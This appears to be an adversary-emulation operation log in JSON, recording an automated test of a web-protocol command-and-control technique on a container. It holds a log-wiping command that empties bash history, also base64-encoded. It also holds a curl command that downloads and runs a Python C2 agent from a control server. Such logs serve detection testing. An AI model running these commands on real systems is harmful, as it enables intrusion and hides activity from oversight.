@@ -1,0 +1,284 @@
+{
+  "name": "autosut-T1071.001-1780516030",
+  "host_group": [
+    {
+      "paw": "autosute0f56507",
+      "sleep_min": 30,
+      "sleep_max": 60,
+      "watchdog": 0,
+      "group": "autosute0f56507",
+      "architecture": "amd64",
+      "platform": "linux",
+      "server": "http://172.17.0.2:8888",
+      "upstream_dest": "http://172.17.0.2:8888",
+      "username": "root",
+      "location": "/usr/local/bin/sandcat",
+      "pid": 1630,
+      "ppid": 1,
+      "trusted": true,
+      "executors": [
+        "proc",
+        "sh"
+      ],
+      "privilege": "Elevated",
+      "exe_name": "sandcat",
+      "host": "d252fad2970f",
+      "contact": "HTTP",
+      "proxy_receivers": {},
+      "proxy_chain": [],
+      "origin_link_id": "",
+      "deadman_enabled": true,
+      "available_contacts": [
+        "HTTP"
+      ],
+      "host_ip_addrs": [
+        "172.17.0.3"
+      ],
+      "display_name": "d252fad2970f$root",
+      "created": "2026-06-03T19:47:08Z",
+      "last_seen": "2026-06-03T19:48:11Z",
+      "links": [
+        {
+          "id": "7c815f90-3d16-4e72-96ee-557abf534bf4",
+          "paw": "autosute0f56507",
+          "command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "plaintext_command": "PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF",
+          "status": 0,
+          "score": 0,
+          "jitter": 0,
+          "decide": "2026-06-03T19:47:08Z",
+          "pin": 0,
+          "pid": "1639",
+          "facts": [],
+          "relationships": [],
+          "used": [],
+          "unique": "7c815f90-3d16-4e72-96ee-557abf534bf4",
+          "collect": "2026-06-03T19:47:08Z",
+          "finish": "2026-06-03T19:47:08Z",
+          "ability": {
+            "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+            "tactic": "defense-evasion",
+            "technique_name": "Indicator Removal on Host: Clear Command History",
+            "technique_id": "T1070.003",
+            "name": "Avoid logs",
+            "description": "Stop terminal from logging history",
+            "executors": [
+              {
+                "name": "sh",
+                "platform": "darwin",
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              {
+                "name": "sh",
+                "platform": "linux",
+                "command": "> $HOME/.bash_history && unset HISTFILE",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              },
+              {
+                "name": "psh",
+                "platform": "windows",
+                "command": "Clear-History;Clear",
+                "code": null,
+                "language": null,
+                "build_target": null,
+                "payloads": [],
+                "uploads": [],
+                "timeout": 60,
+                "parsers": [],
+                "cleanup": [],
+                "variations": [],
+                "additional_info": {}
+              }
+            ],
+            "requirements": [],
+            "privilege": null,
+            "repeatable": false,
+            "buckets": [
+              "defense-evasion"
+            ],
+            "additional_info": {},
+            "access": {},
+            "singleton": false,
+            "plugin": "stockpile",
+            "delete_payload": true
+          },
+          "executor": {
+            "name": "sh",
+            "platform": "linux",
+            "command": "> $HOME/.bash_history && unset HISTFILE",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [],
+            "additional_info": {}
+          },
+          "cleanup": 0,
+          "visibility": {
+            "score": 50,
+            "adjustments": []
+          },
+          "host": "d252fad2970f",
+          "output": "False",
+          "deadman": false,
+          "agent_reported_time": "2026-06-03T19:47:08Z"
+        }
+      ],
+      "pending_contact": "HTTP"
+    }
+  ],
+  "start": "2026-06-03T19:47:10Z",
+  "steps": {
+    "autosute0f56507": {
+      "steps": [
+        {
+          "link_id": "2b19981d-10ee-4d61-9f5f-45169fe427f9",
+          "ability_id": "0ab383be-b819-41bf-91b9-1bd4404d83bf",
+          "command": "server=\"http://0.0.0.0:8888\";curl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;pip install requests beautifulsoup4;python ragdoll.py -W $server/weather",
+          "plaintext_command": "server=\"http://0.0.0.0:8888\";curl -s -X POST -H \"file:ragdoll.py\" -H \"platform:linux\" $server/file/download > ragdoll.py;pip install requests beautifulsoup4;python ragdoll.py -W $server/weather",
+          "delegated": "2026-06-03T19:47:10Z",
+          "run": "2026-06-03T19:48:11Z",
+          "status": 0,
+          "platform": "linux",
+          "executor": "sh",
+          "pid": 1649,
+          "description": "A Python agent which communicates via the HTML contact",
+          "name": "Ragdoll",
+          "attack": {
+            "tactic": "command-and-control",
+            "technique_name": "Application Layer Protocol: Web Protocols",
+            "technique_id": "T1071.001"
+          },
+          "output": {
+            "stdout": "Collecting requests  Downloading requests-2.34.2-py3-none-any.whl.metadata (4.8 kB)Collecting beautifulsoup4  Downloading beautifulsoup4-4.14.3-py3-none-any.whl.metadata (3.8 kB)Collecting charset_normalizer<4,>=2 (from requests)  Downloading charset_normalizer-3.4.7-cp311-cp311-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl.metadata (40 kB)     \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 40.9/40.9 kB 2.6 MB/s eta 0:00:00Collecting idna<4,>=2.5 (from requests)  Downloading idna-3.18-py3-none-any.whl.metadata (6.1 kB)Collecting urllib3<3,>=1.26 (from requests)  Downloading urllib3-2.7.0-py3-none-any.whl.metadata (6.9 kB)Collecting certifi>=2023.5.7 (from requests)  Downloading certifi-2026.5.20-py3-none-any.whl.metadata (2.5 kB)Collecting soupsieve>=1.6.1 (from beautifulsoup4)  Downloading soupsieve-2.8.4-py3-none-any.whl.metadata (4.6 kB)Collecting typing-extensions>=4.0.0 (from beautifulsoup4)  Downloading typing_extensions-4.15.0-py3-none-any.whl.metadata (3.3 kB)Downloading requests-2.34.2-py3-none-any.whl (73 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 73.1/73.1 kB 4.6 MB/s eta 0:00:00Downloading beautifulsoup4-4.14.3-py3-none-any.whl (107 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 107.7/107.7 kB 4.2 MB/s eta 0:00:00Downloading certifi-2026.5.20-py3-none-any.whl (134 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 134.1/134.1 kB 4.6 MB/s eta 0:00:00Downloading charset_normalizer-3.4.7-cp311-cp311-manylinux2014_x86_64.manylinux_2_17_x86_64.manylinux_2_28_x86_64.whl (214 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 214.1/214.1 kB 4.4 MB/s eta 0:00:00Downloading idna-3.18-py3-none-any.whl (65 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 65.5/65.5 kB 6.3 MB/s eta 0:00:00Downloading soupsieve-2.8.4-py3-none-any.whl (37 kB)Downloading typing_extensions-4.15.0-py3-none-any.whl (44 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 44.6/44.6 kB 4.8 MB/s eta 0:00:00Downloading urllib3-2.7.0-py3-none-any.whl (131 kB)   \u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501 131.1/131.1 kB 8.3 MB/s eta 0:00:00Installing collected packages: urllib3, typing-extensions, soupsieve, idna, charset_normalizer, certifi, requests, beautifulsoup4Successfully installed beautifulsoup4-4.14.3 certifi-2026.5.20 charset_normalizer-3.4.7 idna-3.18 requests-2.34.2 soupsieve-2.8.4 typing-extensions-4.15.0 urllib3-2.7.0",
+            "stderr": "sh: 1: curl: not foundWARNING: Running pip as the 'root' user can result in broken permissions and conflicting behaviour with the system package manager. It is recommended to use a virtual environment instead: https://pip.pypa.io/warnings/venv[notice] A new release of pip is available: 24.0 -> 26.1.2[notice] To update, run: pip install --upgrade pip",
+            "exit_code": "0"
+          },
+          "agent_reported_time": "2026-06-03T19:48:03Z"
+        }
+      ]
+    }
+  },
+  "finish": null,
+  "planner": "atomic",
+  "adversary": {
+    "adversary_id": "28ba2e0f-b4f8-4eb1-8a95-9621897d35f3",
+    "name": "autosut-T1071.001-b424d6",
+    "description": "AutoSUT one-off adversary for T1071.001",
+    "atomic_ordering": [
+      "0ab383be-b819-41bf-91b9-1bd4404d83bf"
+    ],
+    "objective": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "tags": [
+      "autosut"
+    ],
+    "has_repeatable_abilities": false,
+    "plugin": ""
+  },
+  "jitter": "0/0",
+  "objectives": {
+    "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+    "name": "default",
+    "description": "This is a default objective that runs forever.",
+    "goals": [
+      {
+        "target": "exhaustion",
+        "value": "complete",
+        "count": 1048576,
+        "operator": "==",
+        "achieved": false
+      }
+    ],
+    "percentage": 0.0
+  },
+  "facts": [
+    {
+      "unique": "file.sensitive.extensionwav",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "wav",
+      "created": "2026-06-03T19:44:38Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "file.sensitive.extensionyml",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "yml",
+      "created": "2026-06-03T19:44:38Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "file.sensitive.extensionpng",
+      "trait": "file.sensitive.extension",
+      "name": "file.sensitive.extension",
+      "value": "png",
+      "created": "2026-06-03T19:44:38Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    },
+    {
+      "unique": "server.malicious.urlkeyloggedsite.com",
+      "trait": "server.malicious.url",
+      "name": "server.malicious.url",
+      "value": "keyloggedsite.com",
+      "created": "2026-06-03T19:44:38Z",
+      "score": 1,
+      "source": "ed32b9c3-9593-4c33-b0db-e2007315096b",
+      "origin_type": "IMPORTED",
+      "links": [],
+      "relationships": [],
+      "limit_count": -1,
+      "collected_by": [],
+      "technique_id": ""
+    }
+  ],
+  "skipped_abilities": [
+    {
+      "autosute0f56507": []
+    }
+  ]
+}
